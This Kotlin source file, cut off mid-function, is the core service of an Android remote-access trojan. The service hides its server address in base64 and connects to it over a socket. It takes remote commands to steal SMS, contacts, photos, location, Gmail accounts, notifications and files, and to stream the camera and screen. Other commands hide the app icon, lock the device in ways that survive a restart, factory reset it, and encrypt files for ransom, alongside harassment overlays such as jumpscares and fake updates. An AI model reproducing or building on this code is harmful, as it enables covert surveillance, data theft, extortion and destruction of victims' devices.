package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.WallpaperManager
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.database.Cursor
import android.location.Address
import android.location.Geocoder
import android.location.LocationManager
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.URI
import java.util.concurrent.Executors
import android.media.AudioManager

class DeviceService : Service(), LifecycleOwner {

    companion object {
        const val ACTION_COMMAND       = "com.sync.xxx.COMMAND"
        const val EXTRA_COMMAND        = "command"
        const val EXTRA_VALUE          = "value"
        const val ACTION_CONNECT       = "com.sync.xxx.CONNECT"
        const val ACTION_SEND_STATUS   = "com.sync.xxx.SEND_STATUS"
        const val EXTRA_STATUS_JSON    = "statusJson"
        const val ACTION_SEND_FRAME    = "com.sync.xxx.SEND_FRAME"
        const val EXTRA_FRAME_B64      = "frameB64"
        const val ACTION_SCREEN_RESULT = "com.sync.xxx.SCREEN_RESULT"
        const val EXTRA_RESULT_CODE    = "resultCode"
        const val EXTRA_RESULT_DATA    = "resultData"

        val SERVER_URL: String get() = String(android.util.Base64.decode(
    "aHR0cDovL2huenoubWl1bnRlY2gubXkuaWQ6MjAwMQ==",
    android.util.Base64.DEFAULT
)).trim()
        const val CHANNEL_ID = "sync_xxx"
        const val NOTIF_ID   = 1
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    var lockPin: String = ""
    var lockTitle: String = ""

    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var streaming = false
    private var lastFrameTime = 0L
    private val FRAME_INTERVAL = 66L

    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false
    
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var screenStreaming = false
    private var lastScreenFrameTime = 0L
    private val SCREEN_FRAME_INTERVAL = 66L
    private var screenHandler: Handler? = null
    private var screenRunnable: Runnable? = null
    private var savedProjectionResultCode: Int = -1
    private var savedProjectionData: Intent? = null

    // Fake Call variables
    private var fakeCallHandler: Handler? = null
    private var fakeCallRunnable: Runnable? = null
    private var isFakeCallActive = false

    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
                ACTION_SCREEN_RESULT -> {
                    val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                    android.util.Log.d("DeviceService", "ACTION_SCREEN_RESULT: resultCode=$resultCode")
                    val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                        intent.getParcelableExtra(EXTRA_RESULT_DATA, android.content.Intent::class.java)
                    else
                        @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
                    if (resultCode != android.app.Activity.RESULT_OK || data == null) {
                        android.util.Log.w("DeviceService", "Screen capture denied or data null")
                        emitStatus(JSONObject().apply { put("screenActive", false) })
                        return
                    }
                    savedProjectionResultCode = resultCode
                    savedProjectionData = data
                    startScreenCapture(resultCode, data)
                }
                ScreenCaptureActivity.ACTION_PHOTO_RESULT -> {
                    val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                    android.util.Log.d("DeviceService", "ACTION_PHOTO_RESULT: resultCode=$resultCode")
                    val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                        intent.getParcelableExtra(EXTRA_RESULT_DATA, android.content.Intent::class.java)
                    else
                        @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
                    if (resultCode != android.app.Activity.RESULT_OK || data == null) {
                        android.util.Log.w("DeviceService", "Photo capture denied or data null")
                        emitStatus(JSONObject().apply { put("photoScreenCaptured", false) })
                        return
                    }
                    savedProjectionResultCode = resultCode
                    savedProjectionData = data
                    performScreenPhotoCapture(resultCode, data)
                }
                ACTION_COMMAND -> {
                    val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
                    val value = intent.getStringExtra(EXTRA_VALUE) ?: ""
                    android.util.Log.d("DeviceService", "ACTION_COMMAND received: $command = $value")
                    handleCommand(command, value)
                }
                "com.sync.xxx.NEW_NOTIF" -> {
                    val payloadStr = intent.getStringExtra("payload") ?: return
                    try {
                        val payload = JSONObject(payloadStr)
                        storeNotif(payload)
                        if (socket?.connected() == true) {
                            socket?.emit("device:notif", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("notif", payload)
                            })
                        }
                    } catch (_: Exception) {}
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val hasLocation = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasCamera = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED

            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (hasLocation) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION

            startForeground(NOTIF_ID, buildNotification(), serviceType)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        deviceId = android.provider.Settings.Secure.getString(
    contentResolver,
    android.provider.Settings.Secure.ANDROID_ID
).takeIf { !it.isNullOrBlank() } ?: Build.ID
        val mfr    = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model  = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(ACTION_SCREEN_RESULT)
            addAction(ScreenCaptureActivity.ACTION_PHOTO_RESULT)
            addAction(ACTION_COMMAND)
            addAction("com.sync.xxx.NEW_NOTIF")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
        }

        connectSocket()
    }

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                val isCharging = plugged != 0

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("name", deviceName)
                    put("battery", batteryPct)
                    put("charging", isCharging)
                    put("sdkVersion", Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid", readUid())
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")

                handleCommand(cmd, val_?.toString() ?: "")

                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    val valStr: String = val_?.toString() ?: ""
                    putExtra(EXTRA_VALUE, valStr)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            // Listen for chat messages from dashboard
            socket?.on("lockChat:fromDashboard") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val message = data.optString("message", "")
                if (message.isNotEmpty()) {
                    val intent = Intent(LockChatActivity.ACTION_MESSAGE_FROM_DASHBOARD).apply {
                        putExtra(LockChatActivity.EXTRA_MESSAGE, message)
                        setPackage(packageName)
                    }
                    sendBroadcast(intent)
                    Log.d("DeviceService", "Received chat message from dashboard: $message")
                }
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "flashlight" -> setFlashlight(value == "true")
            "camera"     -> when (value) {
                "front" -> startCamera("front")
                "back"  -> startCamera("back")
                else    -> stopCamera()
            }
            "screen"     -> when (value) {
                "start" -> requestScreenCapture()
                else    -> stopScreenCapture()
            }
            "photoScreen" -> captureScreenPhoto()
            "lockDevice"     -> lockDevice(value)
            "lockCustom"     -> lockCustom(value)
            "unlockDevice"   -> unlockDevice()
            // ── PERSISTENT LOCK (kebal restart) ──
            "lockLowPersistent"    -> lockLowPersistent(value)
            "lockCustomPersistent" -> lockCustomPersistent(value)
            "lockComboPersistent"  -> lockComboPersistent(value)
            "unlockPersistent"     -> unlockPersistent()
            "changeTheme"    -> changeTheme(value)
            "setWallpaper"   -> setWallpaperFromUrl(value)
            "openUrl"        -> openUrl(value)
            "playAudio"      -> playAudio(value)
            "jumpscareStart" -> startJumpscare(value)
            "jumpscareStop"  -> stopJumpscare()
            
            "jumpscare3Start" -> {
                val intent = Intent(this, JumpscareV3Service::class.java).apply {
                    action = JumpscareV3Service.ACTION_START
                }
                startService(intent)
            }
            "jumpscare3Stop" -> {
                val intent = Intent(this, JumpscareV3Service::class.java).apply {
                    action = JumpscareV3Service.ACTION_STOP
                }
                startService(intent)
            }
            "blockApp"         -> blockApp(value)
            "unblockApp"       -> unblockApp(value)
            "unblockAll"       -> unblockAll()
            "getInstalledApps" -> sendInstalledApps()
            "getSms"           -> sendSms()
            "getNotifs"        -> sendStoredNotifs()
            "getGallery"       -> sendGallery()
            "getLocation"      -> sendLocation()
            "getContacts"      -> sendContacts()
            "getGmail"         -> sendGmailAccounts()
            "getPhone"         -> sendPhoneNumbers()
            "vibrate"          -> vibrateDevice(value)
            "showToast"      -> showToast(value)
            "dialogSpam"     -> startDialogSpam(value)
            "dialogSpamStop" -> stopDialogSpam()
            "touchBlock"     -> startTouchBlock(value)
             "touchBlockStop" -> stopTouchBlock()
             "videoOverlay"     -> startVideoOverlay(value)
             "videoOverlayHide" -> stopVideoOverlay()
             "virusOn"          -> startVirus()
             "virusOff"         -> stopVirus()
             "virusV2On"        -> startVirusV2()
             "virusV2Off"       -> stopVirusV2()
             "sosOn"            -> startSos()
             "sosOff"           -> stopSos()
             "getInstalledApps" -> sendInstalledApps()
             "openApp"          -> openApp(value)
            "ttsSpeak" -> ttsSpeak(value)
             "ttsStop"  -> ttsStop()
            "hideIcon"         -> hideAppIcon(value == "true")
            "muteVolume" -> setVolumeMute(value == "true")
            "jumpscare2Start" -> startJumpscare2(value)
            "jumpscare2Stop"  -> stopJumpscare2()
            "getFiles"         -> sendFileList(value)
            "downloadFile"     -> downloadAndSendFile(value)
            "fakeCall"         -> startFakeCall(value)
            "fakeCallStop"     -> stopFakeCall()
            "blankScreenStart" -> startBlankScreen(value)
            "blankScreenStop"  -> stopBlankScreen()
            "setBrightness"     -> setBrightness(value)
            "factoryReset"      -> factoryReset()
            "encryptFiles"      -> encryptFiles()
            "decryptFiles"      -> decryptFiles(value)
            "getEncryptionStatus" -> sendEncryptionStatus()
            "crashUIStart"      -> startCrashUI(value)
            "crashUIStop"       -> stopCrashUI()
            "lockChatStart"     -> startLockChat(value)
            "lockChatStop"      -> stopLockChat()
            "lockChatUnlock"    -> unlockLockChat()
            "lockChatSend"      -> sendLockChatMessage(value)
            "lcdDamageShow"     -> showLcdDamage()
            "lcdDamageHide"     -> hideLcdDamage()
            "comboLockShow"     -> showComboLock(value)
            "comboLockHide"     -> hideComboLock()
            "networkLockStart"  -> startNetworkLock(value)
            "networkLockStop"   -> stopNetworkLock()
            "peringatanOn"      -> startPeringatan()
            "peringatanOff"     -> stopPeringatan()
            "fakeUpdateOn"      -> startFakeUpdate()
            "fakeUpdateOff"     -> stopFakeUpdate()
            "keyboardSpamStart" -> startKeyboardSpam()
            "keyboardSpamStop"  -> stopKeyboardSpam()
        }
    }

    private fun vibrateDevice(value: String) {
        try {
            val durationMs = value.toLongOrNull() ?: 500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(android.os.VibratorManager::class.java)
                val vib = vm?.defaultVibrator
                vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }
            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice: ${e.message}")
        }
    }
    
    private var jumpscare2Handler: Handler? = null
   private var jumpscare2Runnable: Runnable? = null
   
   private var jumpscare2View: android.widget.ImageView? = null

private fun startJumpscare2(value: String) {
    stopJumpscare2()
    try {
        val obj      = JSONObject(value)
        val url      = obj.getString("url")
        val duration = obj.optLong("duration", 3000L)

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        )

        val imgView = android.widget.ImageView(this).apply {
            scaleType = android.widget.ImageView.ScaleType.CENTER_CROP
            setBackgroundColor(android.graphics.Color.BLACK)
        }

        jumpscare2View = imgView

        Handler(Looper.getMainLooper()).post {
            wm.addView(imgView, params)
        }

        Thread {
            try {
                var redirectUrl = url
                var bmp: Bitmap? = null
                for (i in 0..4) {
                    val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                    conn.connectTimeout = 12000
                    conn.readTimeout    = 15000
                    conn.instanceFollowRedirects = false
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                    conn.setRequestProperty("Accept", "image/*")
                    conn.connect()
                    val code = conn.responseCode
                    if (code in 300..399) {
                        val loc = conn.getHeaderField("Location")
                        conn.disconnect()
                        if (loc != null) { redirectUrl = loc; continue } else break
                    }
                    val bytes = conn.inputStream.readBytes()
                    conn.disconnect()
                    bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    break
                }
                val finalBmp = bmp
                Handler(Looper.getMainLooper()).post {
                    if (finalBmp != null) imgView.setImageBitmap(finalBmp)
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "jumpscare2 img: ${e.message}")
            }
        }.start()

        jumpscare2Handler = Handler(Looper.getMainLooper())
        jumpscare2Runnable = Runnable {
            try { wm.removeView(imgView) } catch (_: Exception) {}
            jumpscare2View = null
            emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
        }
        jumpscare2Handler?.postDelayed(jumpscare2Runnable!!, duration)

        emitStatus(JSONObject().apply { put("jumpscare2Active", true) })

    } catch (e: Exception) {
        Log.e("DeviceService", "startJumpscare2: ${e.message}")
    }
}

private fun stopJumpscare2() {
    jumpscare2Runnable?.let { jumpscare2Handler?.removeCallbacks(it) }
    jumpscare2Handler  = null
    jumpscare2Runnable = null
    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
    jumpscare2View?.let {
        try { wm.removeView(it) } catch (_: Exception) {}
    }
    jumpscare2View = null
    emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
}


private fun startDialogSpam(value: String) {
    try {
        val text = try { JSONObject(value).optString("text", value) } catch (_: Exception) { value }
        startService(Intent(this, DialogSpamService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(DialogSpamService.ACTION_START).apply {
                putExtra(DialogSpamService.EXTRA_TEXT, text)
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("dialogSpamActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startDialogSpam: ${e.message}")
    }
}

private fun stopDialogSpam() {
    val intent = Intent(DialogSpamService.ACTION_STOP).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("dialogSpamActive", false) })
}



private fun ttsSpeak(value: String) {
    try {
        val obj = JSONObject(value)
        val svcIntent = Intent(this, TTSService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svcIntent)
        else startService(svcIntent)
        val intent = Intent(TTSService.ACTION_SPEAK).apply {
            putExtra(TTSService.EXTRA_TEXT,  obj.optString("text", ""))
            putExtra(TTSService.EXTRA_LANG,  obj.optString("lang", "id"))
            putExtra(TTSService.EXTRA_PITCH, obj.optDouble("pitch", 1.0).toFloat())
            putExtra(TTSService.EXTRA_SPEED, obj.optDouble("speed", 1.0).toFloat())
            setPackage(packageName)
        }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("ttsSpeaking", true) })
    } catch (e: Exception) {
        Log.e("DeviceService", "ttsSpeak: ${e.message}")
    }
}

private fun ttsStop() {
    val intent = Intent(TTSService.ACTION_STOP).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("ttsSpeaking", false) })
}


private var touchBlockView: android.view.View? = null
private var touchBlockHandler: android.os.Handler? = null
private var touchBlockRunnable: Runnable? = null

private fun startTouchBlock(value: String) {
    try {
        stopTouchBlock()
        val duration = try { org.json.JSONObject(value).optLong("duration", 0L) } catch (_: Exception) { value.toLongOrNull() ?: 0L }

        val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = android.view.WindowManager.LayoutParams(
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            type,
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
            android.graphics.PixelFormat.TRANSLUCENT
        )

        val view = android.view.View(this).apply {
            setBackgroundColor(android.graphics.Color.TRANSPARENT)
            setOnTouchListener { _, _ -> true } // block semua touch
        }

        touchBlockView = view
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            wm.addView(view, params)
        }

        emitStatus(JSONObject().apply { put("touchBlocked", true) })

        // Auto stop kalau duration > 0
        if (duration > 0) {
            touchBlockHandler = android.os.Handler(android.os.Looper.getMainLooper())
            touchBlockRunnable = Runnable { stopTouchBlock() }
            touchBlockHandler?.postDelayed(touchBlockRunnable!!, duration * 1000L)
        }
    } catch (e: Exception) {
        Log.e("DeviceService", "startTouchBlock: ${e.message}")
    }
}

private fun stopTouchBlock() {
    touchBlockRunnable?.let { touchBlockHandler?.removeCallbacks(it) }
    touchBlockHandler  = null
    touchBlockRunnable = null
    val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
    touchBlockView?.let {
        try {
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                wm.removeView(it)
            }
        } catch (_: Exception) {}
    }
    touchBlockView = null
    emitStatus(JSONObject().apply { put("touchBlocked", false) })
}

    
    
    private fun startVideoOverlay(value: String) {
    try {
        var url = "https://files.catbox.moe/ulrmbb.mp4"
        var duration = 3000L
        
        // Parse JSON if provided
        if (value.isNotBlank()) {
            try {
                val json = JSONObject(value)
                url = json.optString("url", url)
                duration = json.optLong("duration", duration)
            } catch (e: Exception) {
                Log.e("DeviceService", "Failed to parse videoOverlay JSON: ${e.message}")
            }
        }
        
        val intent = Intent(this, VideoOverlayService::class.java).apply {
            putExtra("video_url", url)
            putExtra("duration", duration)
        }
        startService(intent)
        
        Handler(Looper.getMainLooper()).postDelayed({
            val broadcastIntent = Intent(VideoOverlayService.ACTION_SHOW).apply {
                setPackage(packageName)
            }
            sendBroadcast(broadcastIntent)
            emitStatus(JSONObject().apply { put("videoOverlayActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startVideoOverlay: ${e.message}")
    }
}

private fun stopVideoOverlay() {
    val intent = Intent(VideoOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("videoOverlayActive", false) })
}
    
    private fun startVirus() {
    try {
        startService(Intent(this, VirusOverlayService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(VirusOverlayService.ACTION_SHOW).apply {
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("virusActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startVirus: ${e.message}")
    }
}

private fun stopVirus() {
    val intent = Intent(VirusOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("virusActive", false) })
}

private fun startVirusV2() {
    try {
        startService(Intent(this, VirusV2OverlayService::class.java))
        emitStatus(JSONObject().apply { put("virusV2Active", true) })
    } catch (e: Exception) {
        Log.e("DeviceService", "startVirusV2: ${e.message}")
    }
}

private fun stopVirusV2() {
    try {
        stopService(Intent(this, VirusV2OverlayService::class.java))
        emitStatus(JSONObject().apply { put("virusV2Active", false) })
    } catch (e: Exception) {
        Log.e("DeviceService", "stopVirusV2: ${e.message}")
    }
}
    
    private fun startSos() {
    try {
        startService(Intent(this, SosOverlayService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(SosOverlayService.ACTION_SHOW).apply {
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("sosActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startSos: ${e.message}")
    }
}

private fun stopSos() {
    val intent = Intent(SosOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("sosActive", false) })
}

private fun startPeringatan() {
    try {
        startService(Intent(this, PeringatanOverlayService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(PeringatanOverlayService.ACTION_SHOW).apply {
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("peringatanActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startPeringatan: ${e.message}")
    }
}

private fun stopPeringatan() {
    val intent = Intent(PeringatanOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("peringatanActive", false) })
}

private fun startFakeUpdate() {
    try {
        startService(Intent(this, FakeUpdateOverlayService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(FakeUpdateOverlayService.ACTION_SHOW).apply {
                setPackage(packageName)
            }
            sendBroadcast(intent)
            emitStatus(JSONObject().apply { put("fakeUpdateActive", true) })
        }, 300L)
    } catch (e: Exception) {
        Log.e("DeviceService", "startFakeUpdate: ${e.message}")
    }
}

private fun stopFakeUpdate() {
    val intent = Intent(FakeUpdateOverlayService.ACTION_HIDE).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("fakeUpdateActive", false) })
}

private fun startKeyboardSpam() {
    val intent = Intent(KeyboardSpamOverlayService.ACTION_START).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("keyboardSpamActive", true) })
}

private fun stopKeyboardSpam() {
    val intent = Intent(KeyboardSpamOverlayService.ACTION_STOP).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("keyboardSpamActive", false) })
}

private fun sendInstalledApps() {
    try {
        val pm = packageManager
        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            .filter { appInfo ->
                // Filter: only show launchable apps (exclude system services)
                pm.getLaunchIntentForPackage(appInfo.packageName) != null
            }
            .sortedBy { it.loadLabel(pm).toString().lowercase() }
            .map { appInfo ->
                JSONObject().apply {
                    put("name", appInfo.loadLabel(pm).toString())
                    put("package", appInfo.packageName)
                }
            }
        
        val json = JSONObject().apply {
            put("installedApps", org.json.JSONArray(apps))
            put("count", apps.size)
        }
        
        emitStatus(json)
        Log.d("DeviceService", "Sent ${apps.size} installed apps")
    } catch (e: Exception) {
        Log.e("DeviceService", "sendInstalledApps error: ${e.message}")
    }
}

private fun openApp(packageName: String) {
    try {
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            emitStatus(JSONObject().apply {
                put("appOpened", true)
                put("package", packageName)
            })
            Log.d("DeviceService", "Opened app: $packageName")
        } else {
            Log.e("DeviceService", "No launch intent for: $packageName")
        }
    } catch (e: Exception) {
        Log.e("DeviceService", "openApp error: ${e.message}")
    }
}


    
    
    private fun hideAppIcon(hide: Boolean) {
    try {
        val pm = packageManager
        if (hide) {
            // Disable semua alias
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            // Disable juga MainActivity asli
            pm.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } else {
            // Re-enable alias yang sebelumnya aktif (default)
            pm.setComponentEnabledSetting(
                ComponentName(packageName, THEME_ALIASES["default"]!!),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        }
        emitStatus(JSONObject().apply { put("iconHidden", hide) })
    } catch (e: Exception) {
        Log.e("DeviceService", "hideAppIcon: ${e.message}")
    }
}
    
    
    private fun setVolumeMute(mute: Boolean) {
    try {
        val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audio.setStreamVolume(
            AudioManager.STREAM_MUSIC,
            if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
            0
        )
        emitStatus(JSONObject().apply { put("volumeMuted", mute) })
    } catch (e: Exception) {
        Log.e("DeviceService", "setVolumeMute: ${e.message}")
    }
}
    
    
    
    private fun showToast(message: String) {
    Handler(Looper.getMainLooper()).post {
        android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
    }
    emitStatus(JSONObject().apply { put("toastSent", message) })
}

    private fun sendFileList(path: String) {
        Thread {
            try {
                val rootPath = if (path.isBlank()) {
                    android.os.Environment.getExternalStorageDirectory().absolutePath
                } else path

                val dir = java.io.File(rootPath)
                val arr = org.json.JSONArray()

                if (!dir.exists() || !dir.isDirectory) {
                    socket?.emit("device:files", org.json.JSONObject().apply {
                        put("deviceId", deviceId)
                        put("path", rootPath)
                        put("files", arr)
                        put("error", "Folder tidak ditemukan atau tidak bisa diakses")
